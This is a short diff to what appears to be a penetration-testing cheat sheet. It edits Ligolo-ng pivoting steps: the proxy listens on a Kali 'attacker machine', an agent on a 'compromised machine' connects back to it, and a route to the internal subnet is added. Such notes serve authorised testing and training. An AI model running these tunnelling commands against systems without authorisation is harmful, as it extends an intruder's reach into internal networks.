@@ -658,10 +658,12 @@ sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 
 #Kali machine - Attacker machine
-./proxy -laddr 0.0.0.0:9001 -selfcert
+./proxy -laddr 0.0.0.0:11601 -selfcert (# Here port customise option)
+or
+./Lproxy -selfcert
 
-#windows or linux machine - compromised machine
-agent.exe -connect <LHOST>:9001 -ignore-cert
+#windows or linux machine - compromised machine, default port can customise
+agent.exe -connect <LHOST>:11601 -ignore-cert
 
 #In Ligolo-ng console
 session #select host
@@ -669,7 +671,7 @@ ifconfig #Notedown the internal network's subnet
 start #after adding relevent subnet to ligolo interface
 
 #Adding subnet to ligolo interface - Kali linux
-sudo ip r add <subnet> dev ligolo
+sudo ip r add xxx.xxx.xxx.0/24 dev ligolo
 
 ```
 
